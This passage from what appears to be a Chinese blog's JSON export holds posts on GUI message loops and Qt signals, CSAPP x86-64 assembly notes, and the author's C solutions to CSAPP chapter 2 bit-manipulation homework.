在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端\n- 进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)\n- 以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。\n- 接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)\n- 如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来\n- 但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数\n- 如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)\n- 所谓发射出去，我猜测如下\n  1. GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)\n  2. 组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)\n  3. 把该消息放在共享的那块内存，然后每个组件都执行一次消息循环\n","content":"<ul>\n<li><p>应该把整个程序运行过程分解为：</p>\n<ol>\n<li>描述一个界面(前端)</li>\n</ol>\n<ul>\n<li>show出来</li>\n<li>进入无限循环</li>\n<li>在循环里按照刷新频率show这个界面</li>\n<li>每次循环里还检测是否有输入，如果没有，就继续下一次循环</li>\n<li>如果有，就像控制台程序一样，接受输入，给出输出</li>\n<li>当遇到销毁窗口的输入时，退出循环(从而不再show，也不再处理输入，并且从main return回去，被操作系统回收了申请的内存以及画笔权限之类的资源)</li>\n</ul>\n</li>\n<li><p>也就是说，我把一个窗口程序分解为</p>\n<ol>\n<li>定义图形</li>\n<li>重复画图</li>\n<li>对输入给出输出的类似控制台程序</li>\n</ol>\n</li>\n</ul>\n<ul>\n<li>在main函数，我在栈上(或者堆上)申请了几个类变量，这些变量是我的窗口的组件，设置他们的各种属性(比如外观)，设置他们的从属关系，然后把他们用layout布局好，用show函数显示出来。显示出来的是一个图形，当然，类不止有外观方面的属性，所以这其实是一个前端</li>\n<li>进入消息循环，这个图形一直显示着(不知道是不是按照刷新频率不断地执行show函数)</li>\n<li>以上就完成了在屏幕上一直显示一个图形的任务，然后，接下来的任务就是这个程序接受输入，然后输出结果的过程。</li>\n<li>接受的输入有: 键盘、鼠标等等的输入，又或者说这些输入设备他们的状态持续性(被读取的时间点是离散的)、间歇性地被系统函数读取，然后，如果我们的鼠标点击了我们写的这个窗口程序的某个按钮，就会把这个状态PUSH进我们的程序的消息队列，而因为我们的程序在消息循环中一直扫描该队列，所以主程序可以读到输入，并把输入分发给组件(也就是调用组件的函数，把输入作为参数传给函数)</li>\n<li>如果前后端不分离，那么我们可以直接在组件里定义函数，这些函数对输入给出输出，然后直接输出来</li>\n<li>但是，这样程序就不解耦了，这样我们要对输入到输出的映射进行修改就需要修改这个组件的类成员函数</li>\n<li>如果我们换一种实现方式，组件接收到输入(也就是自己接受输入的函数被调用)后把自己的状态的变化发射出去(用SIGNAL函数)</li>\n<li>所谓发射出去，我猜测如下<ol>\n<li>GoF观察者模式的经典实现(就是每个组件的消息接收函数都调用一次)</li>\n<li>组件也有消息循环(这或许需要多线程，毕竟主程序在进行消息循环，如果组件也无线循环那要跑哪个循环)</li>\n<li>把该消息放在共享的那块内存，然后每个组件都执行一次消息循环</li>\n</ol>\n</li>\n</ul>\n","slug":"初学GUI的一些理解（瞎猜）","categories":[{"name":"开发","slug":"开发","permalink":"https://h-zex.github.io/categories/开发/"}],"tags":[{"name":"GUI","slug":"GUI","permalink":"https://h-zex.github.io/tags/GUI/"},{"name":"Qt","slug":"Qt","permalink":"https://h-zex.github.io/tags/Qt/"}]},{"title":"汇编相关","date":"2017-08-06T14:35:44.000Z","path":"2017/08/06/汇编相关/","text":"MOV 操作数不能都是memory register must match the suffix movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展 movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register movz、movs系列have a register or memory location as the source and a register as the destination. cltq: SignExtend(%eax) -&gt; %rax movzlq不存在，可以用movl实现。但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在 其他指令 leaq: has no other size variants The destination operand must be a register. Unary Operations: operand can be either a register or a memory location. Binary Operations: the second operand is used as both a source and a destination the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location. the two operands can’t both be memory location when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory. Shift Operations shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift shift amount can be imm value or %cl a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63 destination can be register or memory location 浮点指令 vmovss, vmovd的操作数可以是（第一个source，第二个destination） memory， XMM XMM， memory 按照书上的描述，好像还可以XMM， XMM vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。 vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM） vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已） vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss） vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq） vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样 MISC intel format have reverse order operands; Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value Such a reference has four components: an immediate offset Imm, a base register rb, an index register ri, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers. Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0 后缀的匹配","raw":"---\ntitle: 汇编相关\ntags:\n- 汇编\ntoc: flase\ncomments: true\nmathjax: true\ncategories:\n- CSAPP\ndate: 2017-08-06 22:35:44\ndescription: CSAPP提到的汇编相关知识点\n---\n#### MOV\n\n- 操作数不能都是memory\n- register must match the suffix\n- movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展\n- movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register\n- movz、movs系列have a register or memory location as the source and a register as the destination.\n- cltq: SignExtend(%eax) -> %rax\n- movzlq不存在，可以用movl实现。**但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在**\n\n#### 其他指令\n\n- leaq:\n  -  has no other size variants\n  -  The destination operand must be a register.\n- Unary Operations:\n  -  operand can be either a register or a memory location. \n- Binary Operations:\n  - the second operand is used as both a source and a destination\n  - the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.\n  - the two operands can't both be memory location\n  - when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.\n- Shift Operations\n  - shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift\n  - shift amount can be imm value or %cl\n  - a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63\n  - destination can be register or memory location\n\n## 浮点指令\n\n- vmovss, vmovd的操作数可以是（第一个source，第二个destination）\n  - memory， XMM\n  - XMM， memory\n  - 按照书上的描述，好像还可以XMM， XMM\n- vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。\n- vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）\n- vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）\n- vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）\n- vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）\n- vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM\n- vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样\n\n#### MISC\n\n- intel format have reverse order operands;\n- Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value \n- Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.\n- Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0\n- 后缀的匹配\n","content":"<h4 id=\"MOV\"><a href=\"#MOV\" class=\"headerlink\" title=\"MOV\"></a>MOV</h4><ul>\n<li>操作数不能都是memory</li>\n<li>register must match the suffix</li>\n<li>movq 的立即数必须再32bit补码能表示的范围内，然后该立即数被符号扩展</li>\n<li>movabsq可以有任意的64bit立即数（没有明确指出是否是补码），但是destination必须是register</li>\n<li>movz、movs系列have a register or memory location as the source and a register as the destination.</li>\n<li>cltq: SignExtend(%eax) -&gt; %rax</li>\n<li>movzlq不存在，可以用movl实现。<strong>但是movzbq、movzwq为什么存在，不是可以用movzbl、movzwl实现（practice problem3.4第四题）。同样的，sal、shl为什么同时存在</strong></li>\n</ul>\n<h4 id=\"其他指令\"><a href=\"#其他指令\" class=\"headerlink\" title=\"其他指令\"></a>其他指令</h4><ul>\n<li>leaq:<ul>\n<li>has no other size variants</li>\n<li>The destination operand must be a register.</li>\n</ul>\n</li>\n<li>Unary Operations:<ul>\n<li>operand can be either a register or a memory location. </li>\n</ul>\n</li>\n<li>Binary Operations:<ul>\n<li>the second operand is used as both a source and a destination</li>\n<li>the first operand can be either an immediate value, a register, or a memory location. The second can be either a register or a memory location.</li>\n<li>the two operands can’t both be memory location</li>\n<li>when the second operand is a memory location, the processor must read the value from memory, perform the operation, and then write the result back to memory.</li>\n</ul>\n</li>\n<li>Shift Operations<ul>\n<li>shift amount is given first and the value to shift is given second. 因为第二个操作数是register或者memory location，所以不能用立即数作为the value to shift</li>\n<li>shift amount can be imm value or %cl</li>\n<li>a shift instruction operating on data values that are w bits long determines the shift amount from the low-order m bits of register %cl, where $2^m=w$. The higher-order bits are ignored.For example, when register %cl has hexadecimal value 0xFF, then instruction salb would shift by 7, while salw would shift by 15, sall would shift by 31, and salq would shift 63</li>\n<li>destination can be register or memory location</li>\n</ul>\n</li>\n</ul>\n<h2 id=\"浮点指令\"><a href=\"#浮点指令\" class=\"headerlink\" title=\"浮点指令\"></a>浮点指令</h2><ul>\n<li>vmovss, vmovd的操作数可以是（第一个source，第二个destination）<ul>\n<li>memory， XMM</li>\n<li>XMM， memory</li>\n<li>按照书上的描述，好像还可以XMM， XMM</li>\n</ul>\n</li>\n<li>vmovaps, vmovapd可以从XMM to XMM，读写内存时，地址需要16字节对齐。</li>\n<li>vcvttss2si,, vcvttss2siq的destination都是通用寄存器（非XMM）</li>\n<li>vcvtsi2ss, vcvtsi2sd, vcvtsi2ssq, vcvtsi2sdq的destination都是XMM，第二个source操作数都是XMM（可能只是书上讲的情形有这个要求而已）</li>\n<li>vunpcklps, vcvtps2pd：single to double（其实是有vcvtsd2ss）</li>\n<li>vmovddup, vcvtpd2psx：double to single（其实是有vcvtsi2sdq）</li>\n<li>vaddss, vsubss, vmulss, vdivss, vmaxss, vminss, sqrtss第一个source是XMM或者memory，第二个source和destination必须是XMM</li>\n<li>vaddsd, vsubsd, vmulsd, vdivsd, vmaxsd, vminsd, sqrtsd同样</li>\n</ul>\n<h4 id=\"MISC\"><a href=\"#MISC\" class=\"headerlink\" title=\"MISC\"></a>MISC</h4><ul>\n<li>intel format have reverse order operands;</li>\n<li>Different instructions allow different ranges of immediate values; the assembler will automatically select the most compact way of encoding a value </li>\n<li>Such a reference has four components: an immediate offset Imm, a base register r<sub>b</sub>, an index register r<sub>i</sub>, and a scale factor s, where s must be 1, 2, 4, or 8. Both the base and index must be 64-bit registers.</li>\n<li>Any instruction that generates a 32-bit value for a register also sets thehigh-order portion of the register to 0</li>\n<li>后缀的匹配</li>\n</ul>\n","slug":"汇编相关","categories":[{"name":"CSAPP","slug":"CSAPP","permalink":"https://h-zex.github.io/categories/CSAPP/"}],"tags":[{"name":"汇编","slug":"汇编","permalink":"https://h-zex.github.io/tags/汇编/"}]},{"title":"CSAPP3e 第二章作业","date":"2017-08-06T04:18:27.000Z","path":"2017/08/06/CSAPP3e-第二章作业/","text":"2.5812345int isLittleEndian1()&#123; int a = 1; return ((char*)&amp;a)[0];&#125; 2.591234int f2_59(int x, int y)&#123; return x&amp;(((1&lt;&lt;(sizeof(int)-1)*8)-1)&lt;&lt;8)|(y&amp;0xFF);&#125; 2.6012345unsigned replaceByte(unsigned x, int i, unsigned char b)&#123; int t = ~0 - ((1LL&lt;&lt;(i+1&lt;&lt;3))-(1&lt;&lt;(i&lt;&lt;3))); return x&amp;t|((unsigned)b&lt;&lt;(i&lt;&lt;3));&#125; 2.611234int A2_61(int x)&#123; return !(x^~0);&#125; 1234int B2_61(int x)&#123; return !x;&#125; 1234int C2_61(int x)&#123; return !((x&amp;0xFF)^0xFF);&#125; 1234int D2_61(int x)&#123; return !((unsigned)x&gt;&gt;((sizeof(int)-1)&lt;&lt;3));&#125; 2.6212345int isRightShiftAreArithmetic()&#123; int x = -1&gt;&gt;1; return x==-1;&#125; 2.6312345unsigned srl(unsigned x, int k)&#123; unsigned xsra = (int)x&gt;&gt;k; return xsra&amp;(1&lt;&lt;(sizeof(int)&lt;&lt;3)-k)-1;&#125; 123456int sra(int x, int k)&#123; int xsrl = (unsigned)x&gt;&gt;k; int t = ~0-(1&lt;&lt;k)+1 &amp; x&gt;&gt;((sizeof(int)&lt;&lt;3)-1); return t|xsrl;&#125; 2.6412345//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始int anyOddOne(unsigned x)&#123; return (x&amp;0xaaaaaaaa)==0xaaaaaaaa;&#125; 2.6512345678910int oddOnesV1(unsigned x)&#123; //思路，用xor消掉成对的1，不成对的记录下来 x ^= x&lt;&lt;16; x ^= x&lt;&lt;8; x ^= x&lt;&lt;4; x ^= x&lt;&lt;2; x ^= x&lt;&lt;1; return x&gt;&gt;31;&#125; 12345678910int oddOnesV2(unsigned x)&#123; //思路与上一个函数类似 x ^= x&lt;&lt;1; //思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位） x ^= x&lt;&lt;2; //只考虑mod4==0的位置 x ^= x&lt;&lt;4; //只考虑mod8==0的位置 x ^= x&lt;&lt;8; //只考虑mod16==0的位置 x ^= x&lt;&lt;16; //只考虑mod32==0的位置 return x&gt;&gt;31;&#125; 2.66123456789int leftMostOne(unsigned x)&#123; x |= x&gt;&gt;1; x |= x&gt;&gt;2; x |= x&gt;&gt;4; x |= x&gt;&gt;8; x |= x&gt;&gt;16; return x-(x&gt;&gt;1);&#125; 2.671234int intSizeIs32()&#123; return INT_MAX==0x80000000-1;&#125; 2.68123456int lowerOneMark(int n)&#123; int t = -!(n-(sizeof(int)&lt;&lt;3)); //方法1 return (1&lt;&lt;n)-1&amp;~t | t;// return ((n!=(sizeof(int)&lt;&lt;3))&lt;&lt;n)-1; //方法2&#125; 2.6912345unsigned rotateLeft(unsigned x, int n)&#123; //移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞 return x&gt;&gt;((sizeof(unsigned)&lt;&lt;3)-n-1)&gt;&gt;1 | x&lt;&lt;n;&#125; 2.701234int fitBits(int x, int n)&#123; return x&gt;&gt;n-1==0 | x&gt;&gt;n-1==-1;&#125; 2.7112345typedef unsigned pack_t;int xbyte(pack_t word, int bytenum)&#123; return (int)word&lt;&lt;(3-bytenum&lt;&lt;3)&gt;&gt;24;&#125; 2.73123456789101112131415161718192021222324252627int saturatingAdd(int x, int y)&#123; //方法一 int t = (sizeof(int)&lt;&lt;3)-1; int p = ((unsigned)x&gt;&gt;t)+((unsigned)y&gt;&gt;t)+((unsigned)x+y&gt;&gt;t); t = ((unsigned)x&gt;&gt;t)+((unsigned)y&gt;&gt;t); return -(p==2&amp;&amp;t!=1)&amp;INT_MIN | -(p==1&amp;&amp;t!=1)&amp;INT_MAX | -(p==0||t==1)&amp;x+y | -(p==3||t==1)&amp;x+y; //方法二 int t = (sizeof(int)&lt;&lt;3)-1; int p = ((unsigned)x&gt;&gt;t&lt;&lt;2)|((unsigned)y&gt;&gt;t&lt;&lt;1)|((unsigned)x+y&gt;&gt;t); return -(p==6)&amp;INT_MIN | -(p==1)&amp;INT_MAX | -(p!=1&amp;&amp;p!=6)&amp;x+y; //方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904） int w=sizeof(int)&lt;&lt;3; int sum = x+y; int mask = 1&lt;&lt;(w-1); int x_lmb = x&amp;mask; int y_lmb = y&amp;mask; int sum_lmb = sum&amp;mask; int neg_of = x_lmb &amp;&amp; y_lmb &amp;&amp; (!sum_lmb); int pos_of = !x_lmb &amp;&amp; !y_lmb &amp;&amp; sum_lmb; (pos_of &amp;&amp;(sum=INT_MAX)) || (neg_of &amp;&amp; (sum = INT_MIN)); //这一条不错 return sum;&#125; 2.741234567int tsubOk(int x, int y)&#123; int t = (sizeof(int)&lt;&lt;3)-1; int p = (unsigned)x&gt;&gt;t&lt;&lt;2 | (unsigned)-y&gt;&gt;t&lt;&lt;1 | (unsigned)x-y&gt;&gt;t; t = y==INT_MIN; return p!=6 &amp;&amp; p!=1 &amp;&amp; !t || t &amp;&amp; p==6;&#125; 2.75123456unsigned unsignedHightProd(unsigned x, unsigned y)&#123; unsigned t = signed_high_prod(x, y); int l = (sizeof(int)&lt;&lt;3)-1; return t + (x&gt;&gt;l)*x+(y&gt;&gt;l)*y;&#125; 2.761234567891011void* Calloc(size_t nmemb, size_t size)&#123; size_t t = nmemb*size; void *p; if(!size || t/size==nmemb)&#123; p = malloc(t); if(!p)return NULL; memset(p, 0, t); &#125;else return NULL; return p;&#125; 2.7712345678int f2_77(int x)&#123; int k1 = (x&lt;&lt;4)+x; int k2 = -(x&lt;&lt;3)+x; int k3 = (x&lt;&lt;6)-(x&lt;&lt;2); int k4 = -(x&lt;&lt;7)+(x&lt;&lt;4); return (k1==x*17)&lt;&lt;3 | (k2==x*-7)&lt;&lt;2 | (k3==x*60)&lt;&lt;1 | k4==x*-112;&#125; 2.78123456int dividePower2(int x, int k)&#123; int l = sizeof(int)&lt;&lt;3; l = -(x&gt;&gt;l-1); return (l&lt;&lt;k)-l+x &gt;&gt; k;&#125; 2.791234567int mul3div4(int x)&#123; x = (x&lt;&lt;2) - x; int l = sizeof(int)&lt;&lt;3; int t = -(x&gt;&gt;l-1); return (t&lt;&lt;2)-t+x &gt;&gt; 2;&#125; 2.8012345678910int threefourths(int x)&#123; int t = x&amp;0x3; int t2 = -(x&gt;&gt;(sizeof(int)&lt;&lt;3)-1); int p = (x&gt;&gt;2); p = (p&lt;&lt;1)+p; t = (t&lt;&lt;1)+t; p += (t&gt;&gt;2) + (t2&amp;&amp;t); return p;&#125; 2.8112345678910int hw281A(int k)&#123; return 0-(1&lt;&lt;k-!!k&lt;&lt;!!k); //k may equal to 0 or 32;&#125;int hw281B(int j, int k)&#123; int t = k+j; return (0-(1&lt;&lt;j-!!j&lt;&lt;!!j)) ^ (0-(1&lt;&lt;t-!!t&lt;&lt;!!t));&#125; 2.8212345678/* * A: NO; x== 0x10000000, B==rand(); * B: Yes; * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。 * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加 * D: Yes; * E: Yes; */ 2.83$\\sum_{i=1}^{\\infty}Y2^{-ki}$ 2.841return ((sx&lt;sy) &amp;&amp; ux!=0 &amp;&amp; uy!=0x80000000) | (sx==sy) &amp; !!(ux-uy);","raw":"---\ntitle: CSAPP3e 第二章作业\ntoc: false\ncomments: true\nmathjax: true\ndate: 2017-08-06 12:18:27\ntags:\n- CSAPP Homework\ndescription: My solution to Ch2's Hw\ncategories:\n- CSAPP\n---\n\n## 2.58\n```c\nint isLittleEndian1()\n{\n\tint a = 1;\n\treturn ((char*)&a)[0];\n}\n```\n\n\n## 2.59\n```c\nint f2_59(int x, int y)\n{\n\treturn x&(((1<<(sizeof(int)-1)*8)-1)<<8)|(y&0xFF);\n}\n```\n\n\n## 2.60\n```c\nunsigned replaceByte(unsigned x, int i, unsigned char b)\n{\n\tint t = ~0 - ((1LL<<(i+1<<3))-(1<<(i<<3)));\n\treturn x&t|((unsigned)b<<(i<<3));\n}\n```\n\n\n## 2.61\n```c\nint A2_61(int x)\n{\n\treturn !(x^~0);\n}\n```\n\n```c\nint B2_61(int x)\n{\n\treturn !x;\n}\n```\n\n```c\nint C2_61(int x)\n{\n\treturn !((x&0xFF)^0xFF);\n}\n```\n\n```c\nint D2_61(int x)\n{\n\treturn !((unsigned)x>>((sizeof(int)-1)<<3));\n}\n```\n\n\n## 2.62\n```c\nint isRightShiftAreArithmetic()\n{\n\tint x = -1>>1;\n\treturn x==-1;\n}\n```\n\n\n## 2.63\n```c\nunsigned srl(unsigned x, int k)\n{\n\tunsigned xsra = (int)x>>k;\n\treturn xsra&(1<<(sizeof(int)<<3)-k)-1;\n}\n```\n\n```c\nint sra(int x, int k)\n{\n\tint xsrl = (unsigned)x>>k;\n\tint t = ~0-(1<<k)+1 & x>>((sizeof(int)<<3)-1);\n\treturn t|xsrl;\n}\n```\n\n\n## 2.64\n```c\n//题目中没有说bit从0开始计数还是从1开始，此处默认从0开始\nint anyOddOne(unsigned x)\n{\n\treturn (x&0xaaaaaaaa)==0xaaaaaaaa;\n}\n```\n\n\n## 2.65\n```c\nint oddOnesV1(unsigned x)\n{\n\t//思路，用xor消掉成对的1，不成对的记录下来\n\tx ^= x<<16;\n\tx ^= x<<8;\n\tx ^= x<<4;\n\tx ^= x<<2;\n\tx ^= x<<1;\n\treturn x>>31;\n}\n```\n\n```c\nint oddOnesV2(unsigned x)\n{\n\t//思路与上一个函数类似\n\tx ^= x<<1;\t//思考的时候只考虑奇数位，不需要考虑偶数位（从1开始计数bit位）\n\tx ^= x<<2;\t//只考虑mod4==0的位置\n\tx ^= x<<4;\t//只考虑mod8==0的位置\n\tx ^= x<<8;\t//只考虑mod16==0的位置\n\tx ^= x<<16;\t//只考虑mod32==0的位置\n\treturn x>>31;\n}\n```\n\n\n## 2.66\n```c\nint leftMostOne(unsigned x)\n{\n\tx |= x>>1;\n\tx |= x>>2;\n\tx |= x>>4;\n\tx |= x>>8;\n\tx |= x>>16;\n\treturn x-(x>>1);\n}\n```\n\n\n## 2.67\n```c\nint intSizeIs32()\n{\n\treturn INT_MAX==0x80000000-1;\n}\n```\n\n\n## 2.68\n```c\nint lowerOneMark(int n)\n{\n\tint t = -!(n-(sizeof(int)<<3));\t//方法1\n\treturn (1<<n)-1&~t | t;\n//\treturn ((n!=(sizeof(int)<<3))<<n)-1;\t//方法2\n}\n```\n\n\n## 2.69\n```c\nunsigned rotateLeft(unsigned x, int n)\n{\n\t//移位sizeof*8不行，但是移位sizeof*8-1再移位1就可行了，上一题也可以这样搞\n\treturn x>>((sizeof(unsigned)<<3)-n-1)>>1 | x<<n;\n}\n```\n\n\n## 2.70\n```c\nint fitBits(int x, int n)\n{\n\treturn x>>n-1==0 | x>>n-1==-1;\n}\n```\n\n\n## 2.71\n```c\ntypedef unsigned pack_t;\nint xbyte(pack_t word, int bytenum)\n{\n\treturn (int)word<<(3-bytenum<<3)>>24;\n}\n```\n\n## 2.73\n```c\nint saturatingAdd(int x, int y)\n{\n\t//方法一\n\tint t = (sizeof(int)<<3)-1;\n\tint p = ((unsigned)x>>t)+((unsigned)y>>t)+((unsigned)x+y>>t);\n\tt = ((unsigned)x>>t)+((unsigned)y>>t);\n\treturn -(p==2&&t!=1)&INT_MIN | -(p==1&&t!=1)&INT_MAX | -(p==0||t==1)&x+y | -(p==3||t==1)&x+y;\n  \n\t//方法二\n\tint t = (sizeof(int)<<3)-1;\n\tint p = ((unsigned)x>>t<<2)|((unsigned)y>>t<<1)|((unsigned)x+y>>t);\n\treturn -(p==6)&INT_MIN | -(p==1)&INT_MAX | -(p!=1&&p!=6)&x+y;\n  \n\t//方法三（from http://blog.csdn.net/yang_f_k/article/details/8857904）\n\tint w=sizeof(int)<<3;\n\tint sum = x+y;\n\tint mask = 1<<(w-1);\n\tint x_lmb = x&mask;\n\tint y_lmb = y&mask;\n\tint sum_lmb = sum&mask;\n\t\n\tint neg_of = x_lmb && y_lmb && (!sum_lmb);\n\tint pos_of = !x_lmb && !y_lmb && sum_lmb;\n\t\n\t(pos_of &&(sum=INT_MAX)) || (neg_of && (sum = INT_MIN)); //这一条不错\n\treturn sum;\n}\n```\n\n\n## 2.74\n```c\nint tsubOk(int x, int y)\n{\n\tint t = (sizeof(int)<<3)-1;\n\tint p = (unsigned)x>>t<<2 | (unsigned)-y>>t<<1 | (unsigned)x-y>>t;\n\tt = y==INT_MIN;\n\treturn p!=6 && p!=1 && !t || t && p==6;\n}\n```\n\n\n## 2.75\n```c\nunsigned unsignedHightProd(unsigned x, unsigned y)\n{\n\tunsigned t = signed_high_prod(x, y);\n\tint l = (sizeof(int)<<3)-1;\n\treturn t + (x>>l)*x+(y>>l)*y;\n}\n```\n\n\n## 2.76\n```c\nvoid* Calloc(size_t nmemb, size_t size)\n{\n\tsize_t t = nmemb*size;\n\tvoid *p;\n\tif(!size || t/size==nmemb){\n\t\tp = malloc(t);\n\t\tif(!p)return NULL;\n\t\tmemset(p, 0, t);\n\t}else return NULL;\n\treturn p;\n}\n```\n\n\n## 2.77\n```c\nint f2_77(int x)\n{\n\tint k1 = (x<<4)+x;\n\tint k2 = -(x<<3)+x;\n\tint k3 = (x<<6)-(x<<2);\n\tint k4 = -(x<<7)+(x<<4);\n\treturn (k1==x*17)<<3 | (k2==x*-7)<<2 | (k3==x*60)<<1 | k4==x*-112;\n}\n```\n\n## 2.78\n```c\nint dividePower2(int x, int k)\n{\n\tint l = sizeof(int)<<3;\n\tl = -(x>>l-1);\n\treturn (l<<k)-l+x >> k;\n}\n```\n## 2.79\n```c\nint mul3div4(int x)\n{\n\tx = (x<<2) - x;\n\tint l = sizeof(int)<<3;\n\tint t = -(x>>l-1);\n\treturn (t<<2)-t+x >> 2;\n}\n```\n## 2.80\n```c\nint threefourths(int x)\n{\n\tint t = x&0x3;\n\tint t2 = -(x>>(sizeof(int)<<3)-1);\n\tint p = (x>>2);\n\tp = (p<<1)+p;\n\tt = (t<<1)+t;\n\tp += (t>>2) + (t2&&t);\n\treturn p;\n}\n```\n## 2.81\n```c\nint hw281A(int k)\n{\n\treturn 0-(1<<k-!!k<<!!k);\t//k may equal to 0 or 32;\n}\n\nint hw281B(int j, int k)\n{\n\tint t = k+j;\n\treturn (0-(1<<j-!!j<<!!j)) ^ (0-(1<<t-!!t<<!!t));\n}\n```\n## 2.82\n```c\n/*\n * A: NO; x== 0x10000000, B==rand();\n * B: Yes; \n * C: Yes; 因为，取反操作之后立刻截断与计算完之后再截断是等价的。\n * 可以两边都加上1，从而左右两个过程（截断之前）都是两个负数相加\n * D: Yes;\n * E: Yes;\n */\n```\n\n## 2.83\n$\\sum_{i=1}^{\\infty}Y*2^{-k*i}$\n\n## 2.84\n```c\nreturn ((sx<sy) && ux!=0 && uy!=0x80000000) | (sx==sy) & !!(ux-uy);\n```\n","content":"<h2 id=\"2-58\"><a href=\"#2-58\" class=\"headerlink\" title=\"2.58\"></a>2.58</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">isLittleEndian1</span><span class=\"params\">()</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">int</span> a = <span class=\"number\">1</span>;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> ((<span class=\"keyword\">char</span>*)&amp;a)[<span class=\"number\">0</span>];</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"2-59\"><a href=\"#2-59\" class=\"headerlink\" title=\"2.59\"></a>2.59</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"function\"><span class=\"keyword\">int</span> <span class=\"title\">f2_59</span><span class=\"params\">(<span class=\"keyword\">int</span> x, <span class=\"keyword\">int</span> y)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> x&amp;(((<span class=\"number\">1</span>&lt;&lt;(<span class=\"keyword\">sizeof</span>(<span class=\"keyword\">int</span>)<span class=\"number\">-1</span>)*<span class=\"number\">8</span>)<span 